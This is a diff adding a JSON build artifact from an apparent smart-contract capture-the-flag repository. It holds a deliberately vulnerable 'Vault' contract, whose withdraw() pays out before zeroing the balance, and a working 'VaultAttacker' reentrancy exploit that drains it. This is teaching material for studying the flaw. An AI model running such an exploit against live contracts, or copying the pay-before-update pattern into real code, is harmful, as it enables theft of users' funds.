@@ -1,0 +1,171 @@
+{
+  "repo": "JN13012/smart-contract-ctf",
+  "commit": "17fbf5b072cd74578c09f05a7c781d2cb07f90ec",
+  "contracts": {
+    "Vault": {
+      "file": "Vault.sol",
+      "path": "src/01-Reentrancy/Vault.sol",
+      "abi": [
+        {
+          "type": "function",
+          "name": "balanceOf",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "outputs": [
+            {
+              "name": "amount",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "deposit",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "withdraw",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "event",
+          "name": "Deposited",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "event",
+          "name": "Withdrawn",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "error",
+          "name": "NothingToWithdraw",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "TransferFailed",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "ZeroDeposit",
+          "inputs": []
+        }
+      ],
+      "bytecode": "0x6080604052348015600e575f5ffd5b506102718061001c5f395ff3fe608060405260043610610033575f3560e01c80633ccfd60b1461003757806370a082311461004d578063d0e30db01461008a575b5f5ffd5b348015610042575f5ffd5b5061004b610092565b005b348015610058575f5ffd5b506100786100673660046101e9565b5f6020819052908152604090205481565b60405190815260200160405180910390f35b61004b61016f565b335f90815260208190526040812054908190036100c257604051630686827b60e51b815260040160405180910390fd5b6040515f90339083908381818185875af1925050503d805f8114610101576040519150601f19603f3d011682016040523d82523d5f602084013e610106565b606091505b5050905080610128576040516312171d8360e31b815260040160405180910390fd5b335f818152602081815260408083209290925590518481527f7084f5476618d8e60b11ef0d7d3f06914655adb8793e28ff7f018d4c76d505d5910160405180910390a25050565b345f0361018f576040516356316e8760e01b815260040160405180910390fd5b335f90815260208190526040812080543492906101ad908490610216565b909155505060405134815233907f2da466a7b24304f47e87fa2e1e5a81b9831ce54fec19055ce277ca2f39ba42c49060200160405180910390a2565b5f602082840312156101f9575f5ffd5b81356001600160a01b038116811461020f575f5ffd5b9392505050565b8082018082111561023557634e487b7160e01b5f52601160045260245ffd5b9291505056fea26469706673582212202cbbb02e7a145617bde6ed097652477449db8870007d570023c8fe65ed22ee1264736f6c634300081c0033",
+      "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\nimport {IVault} from \"./IVault.sol\";\n\n/// @title Vault\n/// @author Jérémie Nagi\n/// @notice Users deposit ETH and withdraw their whole balance at any time.\n/// @custom:ctf Level 1. Goal: empty the vault. In withdraw(), what happens first: the payment or the\n/// balance update? And what can a contract do when it receives ETH?\ncontract Vault is IVault {\n    /// @notice What the vault owes each account.\n    mapping(address account => uint256 amount) public balanceOf;\n\n    event Deposited(address indexed account, uint256 amount);\n    event Withdrawn(address indexed account, uint256 amount);\n\n    error ZeroDeposit();\n    error NothingToWithdraw();\n    error TransferFailed();\n\n    /// @notice Adds the ETH sent to the caller's balance.\n    function deposit() external payable override {\n        if (msg.value == 0) revert ZeroDeposit();\n        balanceOf[msg.sender] += msg.value;\n        emit Deposited(msg.sender, msg.value);\n    }\n\n    /// @notice Sends the caller's whole balance back to them.\n    function withdraw() external override {\n        uint256 amount = balanceOf[msg.sender];\n        if (amount == 0) revert NothingToWithdraw();\n\n        (bool sent,) = msg.sender.call{value: amount}(\"\");\n        if (!sent) revert TransferFailed();\n\n        balanceOf[msg.sender] = 0;\n        emit Withdrawn(msg.sender, amount);\n    }\n}\n"
+    },
+    "VaultAttacker": {
+      "file": "VaultAttacker.sol",
+      "path": "src/01-Reentrancy/VaultAttacker.sol",
+      "abi": [
+        {
+          "type": "constructor",
+          "inputs": [
+            {
+              "name": "target",
+              "type": "address",
+              "internalType": "contract IVault"
+            }
+          ],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "receive",
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "attack",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "owner",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "vault",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "address",
+              "internalType": "contract IVault"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "error",
+          "name": "NotOwner",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "PayoutFailed",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "StakeRequired",
+          "inputs": []
+        }
+      ],
+      "bytecode": "0x60c060405234801561000f575f5ffd5b5060405161047738038061047783398101604081905261002e91610043565b6001600160a01b03166080523360a052610070565b5f60208284031215610053575f5ffd5b81516001600160a01b0381168114610069575f5ffd5b9392505050565b60805160a0516103b86100bf5f395f8181610129015281816101ad01526102f201525f818160460152818160720152818160a50152818161018001528181610213015261028301526103b85ff3fe608060405260043610610036575f3560e01c80638da5cb5b146101185780639e5faafc14610167578063fbfa77cf1461016f575f5ffd5b3661011457336001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001614801561009e57505f547f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03163110155b15610112577f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100fb575f5ffd5b505af115801561010d573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b348015610123575f5ffd5b5061014b7f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b03909116815260200160405180910390f35b6101126101a2565b34801561017a575f5ffd5b5061014b7f000000000000000000000000000000000000000000000000000000000000000081565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146101eb576040516330cd747160e01b815260040160405180910390fd5b345f0361020b576040516337c2e99960e21b815260040160405180910390fd5b345f819055507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b15801561026a575f5ffd5b505af115801561027c573d5f5f3e3d5ffd5b50505050507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156102d9575f5ffd5b505af11580156102eb573d5f5f3e3d5ffd5b505050505f7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316476040515f6040518083038185875af1925050503d805f8114610358576040519150601f19603f3d011682016040523d82523d5f602084013e61035d565b606091505b505090508061037f57604051630ec6ac4160e21b815260040160405180910390fd5b5056fea2646970667358221220cf98f9ff2cabbca5dd85a5f1ee1cebbcea2854c886c40887d974afdd4a9ef01364736f6c634300081c0033",
+      "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\nimport {IVault} from \"./IVault.sol\";\n\n/// @title VaultAttacker\n/// @author Jérémie Nagi\n/// @notice Deposits a stake in a vault, withdraws it, and withdraws again each time the vault pays.\ncontract VaultAttacker {\n    IVault public immutable vault;\n    address public immutable owner;\n\n    /// @dev Amount deposited, paid back by the vault on each `withdraw`.\n    uint256 private stake;\n\n    error NotOwner();\n    error StakeRequired();\n    error PayoutFailed();\n\n    constructor(IVault target) {\n        vault = target;\n        owner = msg.sender;\n    }\n\n    /// @notice Runs the exploit with the ETH sent as the stake.\n    function attack() external payable {\n        if (msg.sender != owner) revert NotOwner();\n        if (msg.value == 0) revert StakeRequired();\n\n        stake = msg.value;\n        vault.deposit{value: msg.value}();\n        vault.withdraw();\n\n        (bool paid,) = owner.call{value: address(this).balance}(\"\");\n        if (!paid) revert PayoutFailed();\n    }\n\n    /// @dev Runs on every payment: asks again while the vault can still pay a full stake.\n    receive() external payable {\n        if (msg.sender == address(vault) && address(vault).balance >= stake) {\n            vault.withdraw();\n        }\n    }\n}\n"
+    }
+  }
+}
